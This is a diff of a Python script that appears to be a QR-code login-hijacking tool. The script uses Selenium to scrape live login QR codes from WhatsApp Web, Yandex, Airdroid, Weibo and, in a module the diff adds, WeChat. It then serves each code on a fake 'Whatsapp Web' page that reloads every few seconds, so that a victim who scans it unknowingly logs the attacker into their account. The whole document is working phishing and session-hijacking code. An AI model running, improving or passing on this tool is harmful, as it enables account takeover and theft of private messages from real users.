@@ -4,7 +4,8 @@
 import base64 ,time ,selenium ,os ,urllib ,sys ,threading ,configparser
 from selenium import webdriver
 from binascii import a2b_base64
-settings = configparser.ConfigParser()
+
+#settings = configparser.ConfigParser()
 
 def Serve_it(port=1337):
 	def serve(port):
@@ -31,6 +32,7 @@ def whatsapp():
 	time.sleep(5)
 	print " [+]Navigating To Website.."
 	driver.get('https://web.whatsapp.com/')
+	time.sleep(5)
 
 	while True:
 		print "-- --- -- --- -- --- -- --- -- --- --"
@@ -48,9 +50,9 @@ def whatsapp():
 			print " [+]The QR code image found !"
 			print " [+]Downloading the image.."
 			binary_data = a2b_base64(src)
-			qr = open("tmp.jpg","wb")
+			qr = open("tmp.png","wb")
 			qr.write(binary_data)
-			print " [#]Saved To tmp.jpg"
+			print " [#]Saved To tmp.png"
 			qr.close()
 			time.sleep(5)
 			continue
@@ -64,6 +66,7 @@ def Yandex():
 	time.sleep(5)
 	print " [+]Navigating To Website.."
 	driver.get("https://passport.yandex.com/auth?mode=qr")
+	time.sleep(5)
 	while True:
 		print "-- --- -- --- -- --- -- --- -- --- --"
 		try:
@@ -85,6 +88,7 @@ def Airdroid():
 	time.sleep(5)
 	print " [+]Navigating To Website.."
 	driver.get("http://web.airdroid.com")
+	time.sleep(5)
 	img_number = 16
 	refresh = 0
 	while True:
@@ -119,7 +123,7 @@ def Weibo():
 	time.sleep(5)
 	print " [+]Navigating To Website.."
 	driver.get("http://weibo.com/login.php")
-
+	time.sleep(5)
 	while True:
 		print "-- --- -- --- -- --- -- --- -- --- --"
 		try:
@@ -137,12 +141,33 @@ def Weibo():
 		except:
 			break
 
+def WeChat():
+	driver = create_driver()
+	time.sleep(5)
+	print " [+]Navigating To Website.."
+	driver.get("https://web.wechat.com")
+	time.sleep(5)
+	while True:
+		print "-- --- -- --- -- --- -- --- -- --- --"
+		try:
+			imgs = driver.find_elements_by_tag_name('img')
+			img = imgs[0]
+			print " [+]The QR code image found !"
+			src = img.get_attribute('src')
+			print " [+]Downloading the image.."
+			qr = urllib.urlretrieve(src, "tmp.png")
+			print " [#]Saved To tmp.png"
+			time.sleep(10)
+			continue
+		except:
+			break
+
 def make(typ="html"):
 	if typ == "html":
 		code = """<html>
 <head><title>Whatsapp Web</title></head><body><script>
 var myTimer;
-myTimer = window.setInterval(reloadD,5000);
+myTimer = window.setInterval(reloadD,3000);
 function reloadD(){
 d = new Date();
 document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();
@@ -155,7 +180,7 @@ document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();
 		code = """<html>
 <head><title>Whatsapp Web</title></head><body><script>
 var myTimer;
-myTimer = window.setInterval(reloadD,5000);
+myTimer = window.setInterval(reloadD,3000);
 function reloadD(){
 d = new Date();
 document.getElementById('qrcodew').src="tmp.svg?h="+d.getTime();
@@ -250,14 +275,10 @@ def main():
 		elif int(choice_2) == 2:
 			port = raw_input(" Port to listen on (Default 1337) : ")
 			if port == "":port = 1337
-			settings.read("Data/Simple.ini")
-			url = settings.get("WeChat","url")
-			image_number = settings.get("WeChat","image_number")
-			classname = settings.get("WeChat","classname")
 			clear()
 			make()
 			Serve_it(port)
-			Simple_Exploit(classname,url ,int(image_number))
+			WeChat()
 			main()
 
 		#3
@@ -352,7 +373,7 @@ def main():
 			main()
 
 	#Other Services
-	if choice == 6:
+	if choice == 7:
 		print """
  1.MyDigiPass
  2.Zapper
@@ -365,7 +386,11 @@ def main():
 		if choice_2 == "00":
 			main()
 
-#Customization
-
+	#Customization
+	#if choice == 8:
+		#settings.read("Data/Simple.ini")
+		#url = settings.get("WeChat","url")
+		#image_number = settings.get("WeChat","image_number")
+		#classname = settings.get("WeChat","classname")
 if __name__ == '__main__':
 	main()
